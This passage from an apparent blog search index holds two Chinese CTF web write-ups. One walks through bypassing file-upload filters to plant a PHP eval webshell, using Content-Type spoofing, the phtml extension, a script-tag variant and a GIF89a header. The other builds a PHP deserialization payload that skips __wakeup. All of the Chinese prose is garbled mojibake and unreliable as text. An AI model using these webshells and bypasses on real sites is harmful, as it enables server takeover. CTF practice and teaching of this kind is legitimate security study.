<p>æ­£å¸¸ä¸Šä¼ ,
ä¸‹é¢æˆ‘ä»¬æ–°å»ºä¸ª<code>test.php</code>ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶å¹¶ä¸Šä¼ è¯•è¯•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;shell&quot;</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011721015.png"
alt="image-20211101172102928" />
<figcaption aria-hidden="true">image-20211101172102928</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110312113393.png"
alt="image-20211031211321256" />
<figcaption aria-hidden="true">image-20211031211321256</figcaption>
</figure>
<p>æ˜¾ç„¶æ˜¯ä¸è¡Œçš„, è¢«è¯†åˆ«å‡ºæ¥äº†,
ç”¨BPæŠ“åŒ…æ”¹<code>Content-Type</code>ä¸º<code>image/jpeg</code>çœ‹çœ‹èƒ½ä¸èƒ½éª—è¿‡å»</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110312200646.png"
alt="image-20211031220038474" />
<figcaption aria-hidden="true">image-20211031220038474</figcaption>
</figure>
<p>é”™è¯¯æç¤ºå˜äº†,ä½†è¿˜æ˜¯ä¼ ä¸ä¸Šå», æ¨æµ‹å¯èƒ½æ˜¯æ–‡ä»¶åç¼€æ£€æµ‹,
å¯ä»¥é‡‡ç”¨å…¶ä»–åç¼€ç»•è¿‡,
å¸¸è§çš„åç¼€æœ‰<code>php*(å¦‚php2, php3), pht, phtm, phtml, phps</code>ç­‰</p>
<p>æˆ‘ä»¬è¯•è¯•æŠŠåç¼€æ”¹æˆ<code>phtml</code>è¯•è¯•</p>
<blockquote>
<p>æ³¨æ„: æœ‰çš„åç¼€å³ä½¿ä¸Šä¼ ä¸Šå»äº†ä¹Ÿä¸èƒ½è¢«æ‰§è¡Œ, å–å†³äºæœåŠ¡ç«¯é…ç½®</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110312229070.png"
alt="image-20211031222954778" />
<figcaption aria-hidden="true">image-20211031222954778</figcaption>
</figure>
<p>é”™è¯¯å˜äº†, è¯´æ˜æ”¹åç¼€æ˜¯å¯¹çš„, ä½†æ˜¯è¿™æ¬¡åˆé‡åˆ°æ–°çš„æ£€æµ‹.
è®©ä»£ç é‡Œä¸åŒ…å«<code>&lt;?</code>, åªéœ€è¦æ¢ä¸ªå½¢å¼çš„ä¸€å¥è¯æœ¨é©¬å³å¯:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">langage</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript">@<span class="built_in">eval</span>(@_REQUEST);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110312233021.png"
alt="image-20211031223351820" />
<figcaption aria-hidden="true">image-20211031223351820</figcaption>
</figure>
<p>é”™è¯¯åˆå˜äº†, è¢«æ£€æµ‹åˆ°ä¸æ˜¯å›¾åƒæ–‡ä»¶, æ£€æµ‹æ–‡ä»¶ç±»å‹å¾ˆæœ‰å¯èƒ½æ ¹æ®æ–‡ä»¶å¤´äº†,
æˆ‘ä»¬è¯•ç€ç»™ä¸€å¥è¯æœ¨é©¬åŠ ä¸Šä¸€ä¸ªå›¾åƒæ–‡ä»¶çš„æ–‡ä»¶å¤´ç»•è¿‡æ£€æµ‹</p>
<blockquote>
<p>å¸¸è§çš„å›¾ç‰‡æ–‡ä»¶å¤´</p>
</blockquote>
<ul>
<li>JPG ï¼šFF D8 FF E0 00 10 4A 46 49 46</li>
<li>GIF(ç›¸å½“äºæ–‡æœ¬çš„GIF89a)ï¼š47 49 46 38 39 61</li>
<li>PNGï¼š 89 50 4E 47</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST[&quot;shell&quot;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>GIFçš„æ–‡ä»¶å¤´æœ€å®¹æ˜“æ·»åŠ , æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨å®ƒ, å…¶ä»–æ–‡ä»¶çš„æ–‡ä»¶å¤´è¦åˆ©ç”¨010
Editorè¿™ç§åå…­è¿›åˆ¶ç¼–è¾‘å™¨æ¥è¿›è¡Œæ“ä½œ, ä¸æ–¹ä¾¿</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011630441.png"
alt="image-20211101163042319" />
<figcaption aria-hidden="true">image-20211101163042319</figcaption>
</figure>
<p>ä¸€å¥è¯æœ¨é©¬æˆåŠŸä¸Šä¼ äº†ä¸Šå», çŒœæµ‹ä¸Šä¼ çš„æ–‡ä»¶æ”¾åœ¨uploadæ–‡ä»¶å¤¹ä¸­,
è¯•ç€è®¿é—®ä¸€ä¸‹æ‰§è¡Œä¸ªæŒ‡ä»¤</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011632322.png"
alt="image-20211101163250245" />
<figcaption aria-hidden="true">image-20211101163250245</figcaption>
</figure>
<p>æˆåŠŸæ‰§è¡Œ, æ¥ä¸‹æ¥ä¸ºäº†æ–¹ä¾¿æ“ä½œ, çœå»æ‰‹å·¥ä½¿ç”¨æŒ‡ä»¤çš„éº»çƒ¦,
ä½¿ç”¨<code>ä¸­å›½èœåˆ€</code>å’Œ<code>ä¸­å›½èšå‰‘</code>ä¹‹ç±»çš„è½¯ä»¶è¿æ¥<code>webshell</code>,
è¿™é‡Œæˆ‘ä½¿ç”¨<code>ä¸­å›½èšå‰‘</code>.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011635938.png"
alt="image-20211101163537861" />
<figcaption aria-hidden="true">image-20211101163537861</figcaption>
</figure>
<p>æˆåŠŸè¿æ¥, æ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°<strong>flag</strong>å³å¯,
é€šè¿‡ç¿»æŸ¥æ–‡ä»¶ç›®å½•, å‘ç°<strong>flag</strong>æ–‡ä»¶å°±åœ¨æ ¹ç›®å½•</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011637358.png"
alt="image-20211101163731288" />
<figcaption aria-hidden="true">image-20211101163731288</figcaption>
</figure>
<p>ä»»åŠ¡å®Œæˆ~</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨</tag>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      </tags>
  </entry>
  <entry>
    <title>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP 1</title>
    <url>/2021/11/01/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP-1/</url>
    <content><![CDATA[<p>è¿›å»çœ‹åˆ°ä¸»é¡µæ˜¯ä¸€åªçŒ«, ç§»åŠ¨é¼ æ ‡å¯ä»¥ç”¨æ¯›çº¿å›¢é€—å®ƒ,
å‡ºä¸ªé¢˜å‰ç«¯ä¹Ÿä¹Ÿæ˜¯è´¹å¿ƒäº†</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012309147.png"
alt="image-20211101230918054" />
<figcaption aria-hidden="true">image-20211101230918054</figcaption>
</figure>
<p>ä¸Šé¢è¯´, æœ‰<strong>å¤‡ä»½</strong>ç½‘ç«™çš„ä¹ æƒ¯,
æ‰€ä»¥æˆ‘ä»¬å°±æ‰«ææœåŠ¡å™¨æ‰¾å‡ºå¤‡ä»½æ–‡ä»¶, ä½¿ç”¨<code>dirsearch</code>è¿™ä¸ªè„šæœ¬</p>
<p>ä¸‹è½½åœ°å€: <a
href="https://github.com/maurosoria/dirsearch">Github</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python ./dirsearch.py -e php -u http://0c3bed09-f748-4307-ba14-135d78a27e92.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>
<blockquote>
<p>-e æŒ‡å®šæœåŠ¡å™¨è¿è¡Œç¯å¢ƒ</p>
<p>-u æŒ‡å®šç½‘ç«™ç›®å½•</p>
</blockquote>
<blockquote>
<p>PS: æˆ‘è‡ªå·±æ‰«äº†å¾ˆä¹…ä¹Ÿæ²¡æ‰«å®Œ, çœ‹åˆ«äººçš„WPæ‰«å‡ºäº†<code>www.zip</code>,
æˆ‘ä»¬å°±ä»è¿™é‡Œå¼€å§‹</p>
</blockquote>
<p>ä¸‹è½½<code>www.zip</code>è§£å‹å¾—åˆ°5ä¸ªæ–‡ä»¶</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012317474.png"
alt="image-20211101231756440" />
<figcaption aria-hidden="true">image-20211101231756440</figcaption>
</figure>
<p><code>index.php</code>å…³é”®ä»£ç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">	<span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">	<span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>index.php</code>å¼•å…¥äº†<code>class.php</code>,
ç„¶åååºåˆ—åŒ–å‚æ•°<code>select</code>çš„å€¼,
å…ˆå»çœ‹çœ‹<code>class.php</code>æœ‰ä»€ä¹ˆ</p>
<blockquote>
<p><code>flag.php</code>é‡Œçš„é‚£ä¸ª<strong>flag</strong>æ˜¯é”™çš„</p>
</blockquote>
<p><code>class.php</code>ä»£ç å¦‚ä¸‹:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå°±è¦ç”¨åˆ°<code>php</code>ååºåˆ—åŒ–çš„çŸ¥è¯†äº†,
æˆ‘ä»¬å…ˆåœ¨æœ¬åœ°åˆ¶ä½œå¥½payload</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012343385.png"
alt="image-20211101234324256" />
<figcaption aria-hidden="true">image-20211101234324256</figcaption>
</figure>
<p>å®¡è®¡ä»£ç , ç”¨æˆ·åä¸º<code>"admin"</code>,
å¯†ç ä¸º<code>100</code>(<code>"100"</code>ä¹Ÿè¡Œ, å¼±ç›¸ç­‰)æ—¶,
å¹¶ä½¿<code>__wakeup()</code>ä¸æ‰§è¡Œ, å°±èƒ½æ‹¿åˆ°<strong>flag</strong></p>
<p>åºåˆ—åŒ–åçš„å¯¹è±¡:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
<p>å½“åºåˆ—åŒ–æ–‡æœ¬ä¸­æŒ‡å®šçš„å¯¹è±¡å±æ€§ä¸ªæ•°å¤§äºå®é™…ä¸ªæ•°æ—¶,
<code>__wakeup()</code>æ–¹æ³•å°±ä¸ä¼šè¢«æ‰§è¡Œ ,å®é™…ä¸Šæ˜¯2ä¸ª, æˆ‘ä»¬æ”¹æˆ3ä¸ª:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
<p>æäº¤ä¸Šå»çœ‹çœ‹</p>
<p><img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111020001866.png"
alt="image-20211102000144789" />emmm, è·Ÿæˆ‘æƒ³çš„ä¸ä¸€æ ·</p>
<p>ç»è¿‡ä¸€ç•ªæŸ¥æ‰¾å¾—çŸ¥:
<code>Name</code>ç±»çš„ä¸¤ä¸ªå±æ€§æ˜¯<code>private</code>çš„, åªèƒ½åœ¨ç±»ä¸­è®¿é—®,
åœ¨åºåˆ—åŒ–åçš„æ–‡æœ¬ä¸­è¦ç”¨<code>%00</code>å°†ç±»åå’Œå±æ€§ååˆ†éš”å¼€,
æ‰€ä»¥æ­£ç¡®çš„åºåˆ—åŒ–æ–‡æœ¬åº”è¯¥æ˜¯:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
<p>å†æ¬¡æäº¤:</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111020005666.png"
alt="image-20211102000537580" />
<figcaption aria-hidden="true">image-20211102000537580</figcaption>
</figure>
<p>æˆåŠŸæ‹¿åˆ°<strong>flag</strong></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
</search>
